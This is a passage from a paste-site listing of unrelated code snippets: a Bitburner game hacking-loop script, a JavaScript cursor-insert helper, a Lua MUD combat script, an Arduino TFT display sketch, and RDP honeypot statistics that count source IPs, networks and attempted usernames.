      var hackActive = 0;
      let hackingLevel = ns.getServerRequiredHackingLevel(target);

      // I really wanted to have the time the current attack was activated and would end so this means
      // we can use ""time"" to use later.
      const today = new Date();
      const time = today.getHours() + "":"" + today.getMinutes() + "":"" + today.getSeconds();

      for (let server of servers) {
        if (ns.hasRootAccess(server)) {
          let ramAvailable = ns.getServerMaxRam(server) - ns.getServerUsedRam(server);
          let threads = Math.floor(ramAvailable / ramPerThread);
          let weakenThreadTotal = Math.floor(ns.getServerSecurityLevel(target) / 0.05);
          let growThreadTotal = Math.floor(ns.getServerBaseSecurityLevel(target) / 0.004);
          let hackThreadTotal = Math.floor(ns.getServerBaseSecurityLevel(target) / 0.002);
          let weakenThread = weakenThreadTotal - threadTotal;
          let growThread = growThreadTotal - threadTotal;
          let hackThread = hackThreadTotal - threadTotal;

          // Here we figure out which attack to execute but also make sure it only happens using the maximum number 
          // of threads it needs so we can then attack other servers.
          if (threads > 0) {
            if (ns.getServerSecurityLevel(target) > securityThresh && threadTotal < weakenThread && growActive == 0 && hackActive == 0) {
              sleepTime = ns.getWeakenTime(target);
              if (weakenThreadTotal < threads) {
                ns.exec(""/shared/weaken.js"", server, weakenThreadTotal, target);
                threadTotal += weakenThreadTotal;
              } else if (weakenThread > threadTotal) {
                ns.exec(""/shared/weaken.js"", server, threads, target);
                threadTotal += threads;
              } else {
                ns.exec(""/shared/weaken.js"", server, weakenThread, target);
                threadTotal += weakenThread;
              }
              activeScript = ""Weaken"";
              weakenActive = 1;
            } else if (ns.getServerMoneyAvailable(target) < moneyThresh && threadTotal < growThread && weakenActive == 0 && hackActive == 0) {
              sleepTime = ns.getGrowTime(target);
              if (growThreadTotal < threads) {
                ns.exec(""/shared/grow.js"", server, growThreadTotal, target);
                threadTotal += growThreadTotal;
              } else if (growThread > threadTotal) {
                ns.exec(""/shared/grow.js"", server, threads, target);
                threadTotal += threads;
              } else {
                ns.exec(""/shared/grow.js"", server, growThread, target);
                threadTotal += growThread;
              }
              activeScript = ""Grow"";
              growActive = 1;
            } else if (ns.getServerSecurityLevel(target) < securityThresh && threadTotal < hackThread && weakenActive == 0 && growActive == 0) {
              sleepTime = ns.getHackTime(target);
              if (hackThreadTotal < threads) {
                ns.exec(""/shared/hack.js"", server, hackThreadTotal, target);
                threadTotal += hackThreadTotal;
              } else if (hackThread > threadTotal) {
                ns.exec(""/shared/hack.js"", server, threads, target);
                threadTotal += threads;
              } else {
                ns.exec(""/shared/hack.js"", server, hackThread, target);
                threadTotal += hackThread;
              }
              activeScript = ""Hack"";
              hackActive = 1;
            }
          }
        }
      }
      // This took me a while to figure out but it allows us to modify the time information from earlier so we
      // can then print out the time the script will finish. Handy for people that just like watching the 
      // game run.
      function addSeconds(today, seconds) {
        today.setSeconds(today.getSeconds() + seconds);
        return today;
      }

      const finish = addSeconds(today, (sleepTime / 1000));
      const endTime = finish.getHours() + "":"" + finish.getMinutes() + "":"" + finish.getSeconds();

      // And this just wipes the log window and gives us all the relevant information that we actually care about.
      ns.clearLog();
      ns.print(""Target Server:   "" + target + "" ("" + hackingLevel + "")"");
      ns.print(""Server Money:    "" + formatter.format(targetCurrentMoney) + ""/"" + formatter.format(targetMaxMoney));
      ns.print(""Server Security: "" + Math.floor(targetCurrentSecurity) + ""/"" + targetMaxSecurity + "" ("" + securityThresh + "")"");
      ns.print(""Active Script:   "" + activeScript + "" ("" + threadTotal + "")"");
      ns.print(""Start/Finish:    "" + time + ""/"" + endTime);
      await ns.sleep(sleepTime + 100);
    }
  }
}"
zfiJB8GH,cursorInsert.js,brandonjp,JavaScript,Monday 4th of December 2023 06:54:55 PM CDT,"// Original JavaScript code improved and cleaned up:

/*
 * USAGE: Give your HTML textarea or text input element an ID.
 * Give your button an onClick=""insertThisInThere(text2insert, theInputIDwhereItGoes);"".
 * 
 * EX:  <input type=""text"" id=""myInput"" /> 
 *      <input type=""submit"" value=""Insert ® symbol"" onClick=""insertThisInThere('®', 'myInput');"" />
 *
 */

function insertThisInThere(thisChar, thereId) {
    function theCursorPosition(ofThisInput) {
        // Set a fallback cursor location
        var theCursorLocation = 0;
        
        // Find the cursor location via the IE method...
        if (document.selection) {
            ofThisInput.focus();
            var theSelectionRange = document.selection.createRange();
            theSelectionRange.moveStart('character', -ofThisInput.value.length);
            theCursorLocation = theSelectionRange.text.length;
        } else if (ofThisInput.selectionStart || ofThisInput.selectionStart === 0) {
            // ...or the Firefox way
            theCursorLocation = ofThisInput.selectionStart;
        }
        return theCursorLocation;
    }
    
    // Now get ready to place our new character(s)...
    var theIdElement = document.getElementById(thereId);
    var currentPos = theCursorPosition(theIdElement);
    var origValue = theIdElement.value;
    var newValue = origValue.substr(0, currentPos) + thisChar + origValue.substr(currentPos);

    theIdElement.value = newValue;
}

/**  EXAMPLE HTML:

<h2>Set your cursor anywhere inside the text field, then click the button to insert text at the cursor location. Each button has an onClick=""sendChar2Id('®','toThisId');""</h2>

<br/><hr /><br/>

<input type=""text"" id=""inputOne"" value=""inputOne"" /><br />
<input type=""submit"" onClick=""insertThisInThere('*A*','inputOne')"" value=""Insert *A* into inputOne"" />

<br/><hr /><br/>

<textarea id=""inputTwo"">inputTwo</textarea><br />
<button onClick=""insertThisInThere('*B*','inputTwo');"">Insert *B* into inputOne</button>

**/

// Explanation:

// The `insertThisInThere` function is designed to insert a given character into a text input or textarea element at the current cursor position.
// It takes two parameters: `thisChar` (the character to be inserted) and `thereId` (the ID of the input element where the character should be inserted).

// Inside the function, the `theCursorPosition` function is defined, which determines the current cursor position within the input element.
// It checks if the browser supports the Internet Explorer method (`document.selection`) or the Firefox method (`ofThisInput.selectionStart`) to retrieve the cursor position.
// It returns the cursor position as an integer.

// The main part of the function starts by retrieving the input element using the provided ID (`thereId`).
// It then calls the `theCursorPosition` function to get the current cursor position within the input element.

// The original value of the input element is stored in the `origValue` variable.
// The `newValue` variable is then created by concatenating the original value up to the current cursor position (`origValue.substr(0, currentPos)`),
// the character to be inserted (`thisChar`), and the remaining part of the original value (`origValue.substr(currentPos)`).

// Finally, the `newValue` is assigned back to the input element's value, effectively inserting the character at the current cursor position.

// The provided example HTML demonstrates the usage of the `insertThisInThere` function by showing two input elements: one text input and one textarea.
// Each has a button that triggers the function with different characters to be inserted at the current cursor position."
8neNHwTc,h/ test,ceater_nerd,Lua,Monday 4th of December 2023 06:27:40 PM CDT,"local a, b = pcall(require, 2)
print(a, b)"
7xE45kr8,2023-12-04_stats.json,rdp_snitch,JSON,Monday 4th of December 2023 06:18:00 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 48,
    ""180.93.172.92"": 3,
    ""66.42.56.192"": 3,
    ""87.251.75.145"": 9,
    ""205.210.31.49"": 9,
    ""212.70.149.146"": 12,
    ""103.167.199.68"": 3,
    ""141.98.11.128"": 6,
    ""58.218.204.183"": 9,
    ""104.45.207.186"": 6,
    ""185.161.248.148"": 3,
    ""83.97.73.77"": 9,
    ""185.170.144.3"": 6,
    ""198.235.24.245"": 9,
    ""45.227.254.22"": 9,
    ""211.180.132.154"": 3,
    ""103.214.8.137"": 3,
    ""179.60.147.5"": 3,
    ""152.32.183.13"": 3,
    ""205.210.31.88"": 9,
    ""45.140.17.16"": 12,
    ""185.190.24.101"": 3,
    ""51.75.160.42"": 6,
    ""185.36.81.28"": 3,
    ""185.222.243.154"": 3,
    ""62.204.61.207"": 3,
    ""62.204.41.132"": 6,
    ""45.227.254.9"": 9,
    ""198.235.24.220"": 9
  },
  ""asn"": {
    ""AS48721"": 48,
    ""AS135944"": 3,
    ""AS20473"": 3,
    ""AS208091"": 9,
    ""AS396982"": 36,
    ""AS204428"": 12,
    ""AS140833"": 3,
    ""AS209605"": 9,
    ""AS4134"": 9,
    ""AS8075"": 6,
    ""AS49202"": 3,
    ""AS208312"": 9,
    ""AS197414"": 6,
    ""AS267784"": 18,
    ""AS3786"": 3,
    ""AS140810"": 3,
    ""AS209588"": 3,
    ""AS135377"": 3,
    ""AS198953"": 12,
    ""AS211632"": 3,
    ""AS16276"": 6,
    ""AS136787"": 3,
    ""AS34412"": 3,
    ""AS59425"": 6
  },
  ""isp"": {
    ""Flyservers S.A."": 69,
    ""SPT"": 3,
    ""Choopa"": 3,
    ""Xhost Internet Solutions LP"": 15,
    ""Google LLC"": 36,
    ""SS-Net"": 12,
    ""Interdata Joint Stock Company"": 3,
    ""UAB Host Baltic"": 6,
    ""Chinanet"": 9,
    ""Microsoft Corporation"": 6,
    ""Kisara LLC"": 3,
    ""Red Byte LLC"": 9,
    ""LG DACOM Corporation"": 3,
    ""MEGACORE"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Proton66 OOO"": 12,
    ""Internet Solutions & Innovations LTD."": 3,
    ""OVH SAS"": 6,
    ""SERVEROFFER LT"": 3,
    ""Tefincom S.A."": 3,
    ""Saba Hour Yeganeh Co. ( Private Joint Stock)"": 3,
    ""Horizon LLC"": 6
  },
  ""org"": {
    ""Flyservers S.A"": 48,
    ""Saigon Postel Corporation"": 3,
    ""Unknown"": 12,
    ""Xhost Internet Solutions"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""4Media Ltd"": 12,
    ""INTERCLOUD"": 3,
    ""Chinanet JS"": 9,
    ""Microsoft Azure Cloud (eastus)"": 6,
    ""Kisara LLC"": 3,
    ""Red Byte LLC"": 9,
    ""Xhostis"": 6,
    ""UAB Host Baltic"": 18,
    ""Boranet"": 3,
    ""Megacore Technology Company Limited"": 3,
    ""Cloud Solutions S.A"": 3,
    ""Ucloud Information Technology"": 3,
    ""Proton66 LLC"": 12,
    ""Tribeka Web Advisors S.A"": 3,
    ""OVH Ltd"": 6,
    ""Packethub S.A"": 3,
    ""Saba Abr Mizban LLC"": 3,
    ""Horizon LLC"": 6
  },
  ""regionName"": {
    ""Kaunas"": 57,
    ""Hanoi"": 6,
    ""South West"": 3,
    ""North Holland"": 15,
    ""California"": 36,
    ""Plovdiv"": 12,
    ""Ho Chi Minh"": 3,
    ""Jiangsu"": 9,
    ""Virginia"": 9,
    ""Moscow"": 30,
    ""Vilnius"": 18,
    ""Seoul"": 3,
    ""Distrito Federal"": 3,
    ""Mariehamns stad"": 3,
    ""England"": 6,
    ""Texas"": 3,
    ""Tehran"": 3
  },
  ""country"": {
    ""Lithuania"": 75,
    ""Vietnam"": 9,
    ""Singapore"": 3,
    ""The Netherlands"": 15,
    ""United States"": 48,
    ""Bulgaria"": 12,
    ""China"": 9,
    ""Russia"": 30,
    ""South Korea"": 3,
    ""Venezuela"": 3,
    ""Aland Islands"": 3,
    ""United Kingdom"": 6,
    ""Iran"": 3
  },
  ""account"": {
    ""hello"": 72,
    ""Administr"": 45,
    ""PkKhDScsU"": 3,
    ""uFsSTq"": 3,
    ""MUkHgr"": 3,
    ""(empty)"": 12,
    ""Test"": 9,
    ""XaNqOgPUj"": 3,
    ""NnBqxO"": 3,
    ""resAJQ"": 3,
    ""Domain"": 42,
    ""Administrator"": 3,
    ""EQNzqhVmu"": 3,
    ""CuWeJV"": 3,
    ""LxQrwK"": 3,
    ""KbluliXTN"": 3,
    ""XspHdo"": 3,
    ""jzOEeE"": 3
  },
  ""keyboard"": {
    ""Unknown"": 219
  },
  ""client_build"": {
    ""Unknown"": 219
  },
  ""client_name"": {
    ""Unknown"": 219
  },
  ""ip_type"": {
    ""Unknown"": 141,
    ""hosting"": 54,
    ""proxy"": 24
  }
}"
9AFAGjkM,2023-12-04_stats.json,rdp_snitch,JSON,Monday 4th of December 2023 06:16:06 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 32,
    ""180.93.172.92"": 2,
    ""66.42.56.192"": 2,
    ""87.251.75.145"": 6,
    ""205.210.31.49"": 6,
    ""212.70.149.146"": 8,
    ""103.167.199.68"": 2,
    ""141.98.11.128"": 4,
    ""58.218.204.183"": 6,
    ""104.45.207.186"": 4,
    ""185.161.248.148"": 2,
    ""83.97.73.77"": 6,
    ""185.170.144.3"": 4,
    ""198.235.24.245"": 6,
    ""45.227.254.22"": 6,
    ""211.180.132.154"": 2,
    ""103.214.8.137"": 2,
    ""179.60.147.5"": 2,
    ""152.32.183.13"": 2,
    ""205.210.31.88"": 6,
    ""45.140.17.16"": 8,
    ""185.190.24.101"": 2,
    ""51.75.160.42"": 4,
    ""185.36.81.28"": 2,
    ""185.222.243.154"": 2,
    ""62.204.61.207"": 2,
    ""62.204.41.132"": 4,
    ""45.227.254.9"": 6,
    ""198.235.24.220"": 6
  },
  ""asn"": {
    ""AS48721"": 32,
    ""AS135944"": 2,
    ""AS20473"": 2,
    ""AS208091"": 6,
    ""AS396982"": 24,
    ""AS204428"": 8,
    ""AS140833"": 2,
    ""AS209605"": 6,
    ""AS4134"": 6,
    ""AS8075"": 4,
    ""AS49202"": 2,
    ""AS208312"": 6,
    ""AS197414"": 4,
    ""AS267784"": 12,
    ""AS3786"": 2,
    ""AS140810"": 2,
    ""AS209588"": 2,
    ""AS135377"": 2,
    ""AS198953"": 8,
    ""AS211632"": 2,
    ""AS16276"": 4,
    ""AS136787"": 2,
    ""AS34412"": 2,
    ""AS59425"": 4
  },
  ""isp"": {
    ""Flyservers S.A."": 46,
    ""SPT"": 2,
    ""Choopa"": 2,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 24,
    ""SS-Net"": 8,
    ""Interdata Joint Stock Company"": 2,
    ""UAB Host Baltic"": 4,
    ""Chinanet"": 6,
    ""Microsoft Corporation"": 4,
    ""Kisara LLC"": 2,
    ""Red Byte LLC"": 6,
    ""LG DACOM Corporation"": 2,
    ""MEGACORE"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Proton66 OOO"": 8,
    ""Internet Solutions & Innovations LTD."": 2,
    ""OVH SAS"": 4,
    ""SERVEROFFER LT"": 2,
    ""Tefincom S.A."": 2,
    ""Saba Hour Yeganeh Co. ( Private Joint Stock)"": 2,
    ""Horizon LLC"": 4
  },
  ""org"": {
    ""Flyservers S.A"": 32,
    ""Saigon Postel Corporation"": 2,
    ""Unknown"": 8,
    ""Xhost Internet Solutions"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""4Media Ltd"": 8,
    ""INTERCLOUD"": 2,
    ""Chinanet JS"": 6,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""Kisara LLC"": 2,
    ""Red Byte LLC"": 6,
    ""Xhostis"": 4,
    ""UAB Host Baltic"": 12,
    ""Boranet"": 2,
    ""Megacore Technology Company Limited"": 2,
    ""Cloud Solutions S.A"": 2,
    ""Ucloud Information Technology"": 2,
    ""Proton66 LLC"": 8,
    ""Tribeka Web Advisors S.A"": 2,
    ""OVH Ltd"": 4,
    ""Packethub S.A"": 2,
    ""Saba Abr Mizban LLC"": 2,
    ""Horizon LLC"": 4
  },
  ""regionName"": {
    ""Kaunas"": 38,
    ""Hanoi"": 4,
    ""South West"": 2,
    ""North Holland"": 10,
    ""California"": 24,
    ""Plovdiv"": 8,
    ""Ho Chi Minh"": 2,
    ""Jiangsu"": 6,
    ""Virginia"": 6,
    ""Moscow"": 20,
    ""Vilnius"": 12,
    ""Seoul"": 2,
    ""Distrito Federal"": 2,
    ""Mariehamns stad"": 2,
    ""England"": 4,
    ""Texas"": 2,
    ""Tehran"": 2
  },
  ""country"": {
    ""Lithuania"": 50,
    ""Vietnam"": 6,
    ""Singapore"": 2,
    ""The Netherlands"": 10,
    ""United States"": 32,
    ""Bulgaria"": 8,
    ""China"": 6,
    ""Russia"": 20,
    ""South Korea"": 2,
    ""Venezuela"": 2,
    ""Aland Islands"": 2,
    ""United Kingdom"": 4,
    ""Iran"": 2
  },
  ""account"": {
    ""hello"": 48,
    ""Administr"": 30,
    ""PkKhDScsU"": 2,
    ""uFsSTq"": 2,
    ""MUkHgr"": 2,
    ""(empty)"": 8,
    ""Test"": 6,
    ""XaNqOgPUj"": 2,
    ""NnBqxO"": 2,
    ""resAJQ"": 2,
    ""Domain"": 28,
    ""Administrator"": 2,
    ""EQNzqhVmu"": 2,
    ""CuWeJV"": 2,
    ""LxQrwK"": 2,
    ""KbluliXTN"": 2,
    ""XspHdo"": 2,
    ""jzOEeE"": 2
  },
  ""keyboard"": {
    ""Unknown"": 146
  },
  ""client_build"": {
    ""Unknown"": 146
  },
  ""client_name"": {
    ""Unknown"": 146
  },
  ""ip_type"": {
    ""Unknown"": 94,
    ""hosting"": 36,
    ""proxy"": 16
  }
}"
9Vnee832,2023-12-04_stats.json,rdp_snitch,JSON,Monday 4th of December 2023 06:15:08 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 16,
    ""180.93.172.92"": 1,
    ""66.42.56.192"": 1,
    ""87.251.75.145"": 3,
    ""205.210.31.49"": 3,
    ""212.70.149.146"": 4,
    ""103.167.199.68"": 1,
    ""141.98.11.128"": 2,
    ""58.218.204.183"": 3,
    ""104.45.207.186"": 2,
    ""185.161.248.148"": 1,
    ""83.97.73.77"": 3,
    ""185.170.144.3"": 2,
    ""198.235.24.245"": 3,
    ""45.227.254.22"": 3,
    ""211.180.132.154"": 1,
    ""103.214.8.137"": 1,
    ""179.60.147.5"": 1,
    ""152.32.183.13"": 1,
    ""205.210.31.88"": 3,
    ""45.140.17.16"": 4,
    ""185.190.24.101"": 1,
    ""51.75.160.42"": 2,
    ""185.36.81.28"": 1,
    ""185.222.243.154"": 1,
    ""62.204.61.207"": 1,
    ""62.204.41.132"": 2,
    ""45.227.254.9"": 3,
    ""198.235.24.220"": 3
  },
  ""asn"": {
    ""AS48721"": 16,
    ""AS135944"": 1,
    ""AS20473"": 1,
    ""AS208091"": 3,
    ""AS396982"": 12,
    ""AS204428"": 4,
    ""AS140833"": 1,
    ""AS209605"": 3,
    ""AS4134"": 3,
    ""AS8075"": 2,
    ""AS49202"": 1,
    ""AS208312"": 3,
    ""AS197414"": 2,
    ""AS267784"": 6,
    ""AS3786"": 1,
    ""AS140810"": 1,
    ""AS209588"": 1,
    ""AS135377"": 1,
    ""AS198953"": 4,
    ""AS211632"": 1,
    ""AS16276"": 2,
    ""AS136787"": 1,
    ""AS34412"": 1,
    ""AS59425"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 23,
    ""SPT"": 1,
    ""Choopa"": 1,
    ""Xhost Internet Solutions LP"": 5,
    ""Google LLC"": 12,
    ""SS-Net"": 4,
    ""Interdata Joint Stock Company"": 1,
    ""UAB Host Baltic"": 2,
    ""Chinanet"": 3,
    ""Microsoft Corporation"": 2,
    ""Kisara LLC"": 1,
    ""Red Byte LLC"": 3,
    ""LG DACOM Corporation"": 1,
    ""MEGACORE"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Proton66 OOO"": 4,
    ""Internet Solutions & Innovations LTD."": 1,
    ""OVH SAS"": 2,
    ""SERVEROFFER LT"": 1,
    ""Tefincom S.A."": 1,
    ""Saba Hour Yeganeh Co. ( Private Joint Stock)"": 1,
    ""Horizon LLC"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 16,
    ""Saigon Postel Corporation"": 1,
    ""Unknown"": 4,
    ""Xhost Internet Solutions"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""4Media Ltd"": 4,
    ""INTERCLOUD"": 1,
    ""Chinanet JS"": 3,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Kisara LLC"": 1,
    ""Red Byte LLC"": 3,
    ""Xhostis"": 2,
    ""UAB Host Baltic"": 6,
    ""Boranet"": 1,
    ""Megacore Technology Company Limited"": 1,
    ""Cloud Solutions S.A"": 1,
    ""Ucloud Information Technology"": 1,
    ""Proton66 LLC"": 4,
    ""Tribeka Web Advisors S.A"": 1,
    ""OVH Ltd"": 2,
    ""Packethub S.A"": 1,
    ""Saba Abr Mizban LLC"": 1,
    ""Horizon LLC"": 2
  },
  ""regionName"": {
    ""Kaunas"": 19,
    ""Hanoi"": 2,
    ""South West"": 1,
    ""North Holland"": 5,
    ""California"": 12,
    ""Plovdiv"": 4,
    ""Ho Chi Minh"": 1,
    ""Jiangsu"": 3,
    ""Virginia"": 3,
    ""Moscow"": 10,
    ""Vilnius"": 6,
    ""Seoul"": 1,
    ""Distrito Federal"": 1,
    ""Mariehamns stad"": 1,
    ""England"": 2,
    ""Texas"": 1,
    ""Tehran"": 1
  },
  ""country"": {
    ""Lithuania"": 25,
    ""Vietnam"": 3,
    ""Singapore"": 1,
    ""The Netherlands"": 5,
    ""United States"": 16,
    ""Bulgaria"": 4,
    ""China"": 3,
    ""Russia"": 10,
    ""South Korea"": 1,
    ""Venezuela"": 1,
    ""Aland Islands"": 1,
    ""United Kingdom"": 2,
    ""Iran"": 1
  },
  ""account"": {
    ""hello"": 24,
    ""Administr"": 15,
    ""PkKhDScsU"": 1,
    ""uFsSTq"": 1,
    ""MUkHgr"": 1,
    ""(empty)"": 4,
    ""Test"": 3,
    ""XaNqOgPUj"": 1,
    ""NnBqxO"": 1,
    ""resAJQ"": 1,
    ""Domain"": 14,
    ""Administrator"": 1,
    ""EQNzqhVmu"": 1,
    ""CuWeJV"": 1,
    ""LxQrwK"": 1,
    ""KbluliXTN"": 1,
    ""XspHdo"": 1,
    ""jzOEeE"": 1
  },
  ""keyboard"": {
    ""Unknown"": 73
  },
  ""client_build"": {
    ""Unknown"": 73
  },
  ""client_name"": {
    ""Unknown"": 73
  },
  ""ip_type"": {
    ""Unknown"": 47,
    ""hosting"": 18,
    ""proxy"": 8
  }
}"
YQFmi9Gw,Casa,darcioantonio,C#,Monday 4th of December 2023 05:47:32 PM CDT,0EDSEK7T9O6P5--K23DN6386-8C99D1E7S-KAT1OCPA--K034N73C618690DEEES1K6T0O6P
54uKLn9p,Untitled,nakra,Lua,Monday 4th of December 2023 05:26:47 PM CDT,"function sentmaster()
  sentkillcheck()
  if failsafe == false then
    return
  end
  sentLimbPrep()
  --breakorderdet()
  sentlockvenom()
  sentlockenr()
  sentlockspear()
  sentlocklimb()
  sentlockvenom()
  if ready2trip() or failsafe2 == true then
    tripkillseq()
    failsafe2 = true
    return
  end
  sentSend()
end

function sentlockvenom()

    if
    (
      (affstrack.score.impatience >= 65 and affstrack.score.epilepsy >= 65) or
      (affstrack.score.impatience >= 65 and sentspear == ""doublestrike"")
    ) and
    affstrack.score.dizziness <= 50
  then
    sentvenom = ""larkspur""
  elseif affstrack.score.darkshade < 33 then
    sentvenom = ""darkshade""
  elseif
    (
      (affstrack.score.impatience >= 65 and affstrack.score.epilepsy >= 65) or
      (affstrack.score.impatience >= 65 and sentspear == ""doublestrike"")
    ) and
    affstrack.score.recklessness <= 50
  then
    sentvenom = ""eurypteria""
  elseif affstrack.score.paralysis ~= 100 then
    sentvenom = ""curare""
  end
end

function sentlockenr()
  if not parryblocked() or (parryblocked() and not badgeraffs()) then
    sentenrage = ""badger""
  elseif affstrack.score.sensitivity <= 50 then
    sentenrage = ""raven""
  elseif affstrack.kelpscore <= 3 and affstrack.score.healthleech <= 65 then
    sentenrage = ""fox""
  elseif affstrack.score.blind ~= 100 then
    sentenrage = ""butterfly""
  elseif
    (affstrack.score.impatience >= 65 or sentspear == ""doublestrike"") and
    affstrack.score.hallucinations <= 65
  then
    sentenrage = ""wolf""
  else
    sentenrage = ""badger""
  end
end

function sentlockspear()
  if not parryblocked() then
    sentspear = ""lacerate""
    sentwpn = ""trident""
  elseif affstrack.score.impatience <= 65 or affstrack.score.epilepsy <= 65 then
    sentspear = ""doublestrike""
    sentwpn = ""trident""
  elseif
    affstrack.score.impatience > 65 and affstrack.score.epilepsy > 65 and petrifycheck() >= 2
  then
    sentspear = ""throw handaxe at ""
    sentwpn = ""handaxe""
  elseif affstrack.kelpscore < 2 and affstrack.score.weariness <= 65 then
    sentspear = ""gouge""
    sentwpn = ""trident""
  else
    sentspear = ""throw handaxe at ""
    sentwpn = ""handaxe""
  end
end

function sentkillcheck()
  if petrifycheck() >= 5 then
    failsafe = false
    send(""config usequeueing on"")
    send(
      ""wield trident shield`morph basilisk`enrage butterfly "" ..
      target ..
      ""`petrify "" ..
      target ..
      ""`extirpate "" ..
      target
    )
  elseif
    petrifycheck() == 4 and affstrack.score.blind == 100 and affstrack.score.hallucinations <= 50
  then
    failsafe = false
    send(""config usequeueing on"")
    send(
      ""morph basilisk`wield trident shield`enrage wolf "" ..
      target ..
      ""`petrify "" ..
      target ..
      ""`extirpate "" ..
      target
    )
  elseif (grp == ""group"" and affstrack.score.prone == 100) then
    failsafe = false
    send(""config usequeueing on"")
    send(
      ""alias set sentkill2 stand/enrage raven "" ..
      target ..
      ""/wield trident shield/skullbash "" ..
      target ..
      ""/skullbash "" ..
      target ..
      ""/assess "" ..
      target
    )
    send(""cq all"")
    send(""queue add eqbal sentkill"")
  end
end

function sentlocklimb()
  if #sentLimbTarget > 0 then
    sentLimbPos = math.random(1, #sentLimbTarget)
    sentlimbhit = sentLimbTarget[sentLimbPos]
    if not parryblocked() and affstrack.score.prone == 0 then
      sentlimbhit = """"
    end
    if
      sentlimbcheck(tostring(string.gsub(tripleg, "" "", """"))) and
      not tripcheck(triplegshort) and
      sentlimbhit == tripleg
    then
      sentwpn = ""trident""
      sentspear = ""trip""
    end
    if ak.defs.shield or ak.defs.rebounding then
      sentenrage = ""lemming""
    elseif ak.defs.shield and ak.defs.rebounding then
      sentenrage = ""lemming""
      sentspear = ""rivestrike""
      sentwpn = ""trident""
    end
  end
end

function sentLimbPrep()
  limbtable = {}
  sentLimbPrepTable = sentLimbPrepTable or {}
  sentLimbPrepTable[target:lower()] = sentLimbPrepTable[target:lower()] or {}
  sentLimbTarget = {}
  if limbprepprio == ""sbash"" or nil then
    limbtable = {""head"", ""right leg"", ""left leg""}
    sentlegcount = 2
    sentarmcount = 0
    if not sentlimbcheck(""head"") then
      table.insert(sentLimbTarget, ""head"")
    end
    if not sentlimbcheck(""leftleg"") then
      table.insert(sentLimbTarget, ""left leg"")
      table.insert(sentLimbTarget, ""left leg"")
    end
    if not sentlimbcheck(""rightleg"") then
      table.insert(sentLimbTarget, ""right leg"")
      table.insert(sentLimbTarget, ""right leg"")
    end
    if sentlimbcheck(tostring(string.gsub(tripleg, "" "", """"))) and not tripcheck(triplegshort) then
      table.insert(sentLimbTarget, tripleg)
    end
  end
end

function sentSend()
  send(""config usequeueing off"")
  send(""cq all"")
  send(
    ""alias set sentcom stand/wield "" ..
    sentwpn ..
    "" shield/get body/order entourage kill "" ..
    target ..
    ""/enrage "" ..
    sentenrage ..
    "" "" ..
    target ..
    ""/"" ..
    sentspear ..
    "" "" ..
    target ..
    "" "" ..
    sentlimbhit ..
    "" "" ..
    sentvenom ..
    ""/assess "" ..
    target
  )
  send(""sentcom"")
end"
0xCE8HMs,Arduino TFT Display Shield,metalx1000,Arduino,Monday 4th of December 2023 04:40:16 PM CDT,"// IMPORTANT: Adafruit_TFTLCD LIBRARY MUST BE SPECIFICALLY
// CONFIGURED FOR EITHER THE TFT SHIELD OR THE BREAKOUT BOARD.
// SEE RELEVANT COMMENTS IN Adafruit_TFTLCD.h FOR SETUP.

#include <Adafruit_GFX.h>    // Core graphics library
#include <Adafruit_TFTLCD.h> // Hardware-specific library

String speed = ""0"";
// The control pins for the LCD can be assigned to any digital or
// analog pins...but we'll use the analog pins as this allows us to
// double up the pins with the touch screen (see the TFT paint example).
#define LCD_CS A3 // Chip Select goes to Analog 3
#define LCD_CD A2 // Command/Data goes to Analog 2
#define LCD_WR A1 // LCD Write goes to Analog 1
#define LCD_RD A0 // LCD Read goes to Analog 0

#define LCD_RESET A4 // Can alternately just connect to Arduino's reset pin

// When using the BREAKOUT BOARD only, use these 8 data lines to the LCD:
// For the Arduino Uno, Duemilanove, Diecimila, etc.:
//   D0 connects to digital pin 8  (Notice these are
//   D1 connects to digital pin 9   NOT in order!)
//   D2 connects to digital pin 2
//   D3 connects to digital pin 3
//   D4 connects to digital pin 4
//   D5 connects to digital pin 5
//   D6 connects to digital pin 6
//   D7 connects to digital pin 7
// For the Arduino Mega, use digital pins 22 through 29
// (on the 2-row header at the end of the board).

// Assign human-readable names to some common 16-bit color values:
#define	BLACK   0x0000
#define	BLUE    0x001F
#define	RED     0xF800
#define	GREEN   0x07E0
#define CYAN    0x07FF
#define MAGENTA 0xF81F
#define YELLOW  0xFFE0
#define WHITE   0xFFFF

Adafruit_TFTLCD tft(LCD_CS, LCD_CD, LCD_WR, LCD_RD, LCD_RESET);
// If using the shield, all control and data lines are fixed, and
// a simpler declaration can optionally be used:
// Adafruit_TFTLCD tft;

void setup(void) {
  Serial.begin(9600);
  Serial.println(F(""TFT LCD test""));

#ifdef USE_ADAFRUIT_SHIELD_PINOUT
  Serial.println(F(""Using Adafruit 2.8\"" TFT Arduino Shield Pinout""));
#else
  Serial.println(F(""Using Adafruit 2.8\"" TFT Breakout Board Pinout""));
#endif

  Serial.print(""TFT size is ""); Serial.print(tft.width()); Serial.print(""x""); Serial.println(tft.height());

  tft.reset();

  uint16_t identifier = tft.readID();

  if(identifier == 0x9325) {
    Serial.println(F(""Found ILI9325 LCD driver""));
  } else if(identifier == 0x9328) {
    Serial.println(F(""Found ILI9328 LCD driver""));
  } else if(identifier == 0x7575) {
    Serial.println(F(""Found HX8347G LCD driver""));
  } else if(identifier == 0x9341) {
    Serial.println(F(""Found ILI9341 LCD driver""));
  } else if(identifier == 0x8357) {
    Serial.println(F(""Found HX8357D LCD driver""));
  } else {
    Serial.print(F(""Unknown LCD driver chip: ""));
    Serial.println(identifier, HEX);
    Serial.println(F(""If using the Adafruit 2.8\"" TFT Arduino shield, the line:""));
    Serial.println(F(""  #define USE_ADAFRUIT_SHIELD_PINOUT""));
    Serial.println(F(""should appear in the library header (Adafruit_TFT.h).""));
